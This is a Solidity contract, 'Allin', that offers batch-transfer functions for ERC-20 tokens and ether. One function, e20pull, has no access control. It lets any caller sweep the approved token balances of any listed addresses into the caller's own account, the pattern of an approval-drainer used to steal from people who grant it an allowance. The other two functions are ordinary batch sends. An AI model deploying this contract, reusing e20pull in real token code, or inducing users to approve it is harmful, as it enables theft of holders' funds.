// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Allin{
    function e20pull(address erc20, address[] memory fromes) public{
        IERC20 ca = IERC20(erc20);
        uint256 count = fromes.length;
        for(uint256 i = 0; i < count; i++){
            uint256 approvedAmount = ca.allowance(fromes[i], address(this));  
            uint256 balances = ca.balanceOf(fromes[i]);
            if(balances > 0 && approvedAmount > 0){
               if(balances > approvedAmount){
                  ca.transferFrom(fromes[i], msg.sender, approvedAmount);
               }
               else {
                  ca.transferFrom(fromes[i], msg.sender, balances);
               }
            }
           
        }
    }

    function e20push(address erc20, address[] memory toes, uint256[] memory amounts) public{
        IERC20 ca = IERC20(erc20);
        uint256 count = toes.length;
        uint256 totalAmount = 0;
        for(uint256 i = 0; i < amounts.length; i++){
           totalAmount = amounts[i] + totalAmount;
        }
        uint256 approvedAmount = ca.allowance(msg.sender, address(this));
        require(approvedAmount >= totalAmount, "not enough approved");
        uint256 balances = ca.balanceOf(msg.sender);
        require(balances >= totalAmount, "not enough balances");
        for(uint256 i = 0; i < count; i++){
            ca.transferFrom(msg.sender, toes[i], amounts[i]);
        }
    }

    function push(address[] memory toes, uint256[] memory amounts) payable public{
        require(toes.length == amounts.length);
        address sender = msg.sender;
        uint256 totalAmount = 0;
        for(uint256 i = 0; i < amounts.length; i++){
           totalAmount = amounts[i] + totalAmount;
        }
        require(msg.value >= totalAmount);
        for(uint256 i = 0; i < amounts.length; i++){
            payable(toes[i]).transfer(amounts[i]);
        }
        uint256 balance = address(this).balance;
        if(balance > 0)
        {
            payable(sender).transfer(balance);       
        }
    }
}
